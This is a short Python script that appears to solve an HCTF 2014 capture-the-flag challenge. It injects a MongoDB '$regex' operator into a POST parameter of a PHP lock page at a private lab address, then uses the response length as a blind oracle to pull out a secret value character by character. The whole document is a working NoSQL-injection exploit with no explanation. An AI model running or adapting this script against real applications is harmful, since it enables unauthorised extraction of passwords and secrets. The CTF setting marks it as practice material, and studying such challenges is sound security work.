import requests

def go():
	ori = '0123456789abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	url = 'http://192.168.32.145/mongodb/HCTF2014_LOCK.php';
	

	password = '';
	flag = 0 ;

	while True:
		flag = 0;
		for i in ori:
			#print i;
			finalurl = url ;
			#print 'finalurl:' + finalurl;
			lock = '^' + password + i;
			postdata = {'lock[$regex]':lock,'key':'123'};
			#print postdata;
			r = requests.post(finalurl,data=postdata);
			
			#print 'r.text:' + r.text;
			#print 'r.length:' + str(len(r.text));
			
			if len(r.text) != 13 :
				r.close();
				flag = 1;
				password += i ;
				print password;
				break;

			r.close();
		if flag != 1:
			break;

if __name__ == '__main__':
	go();	
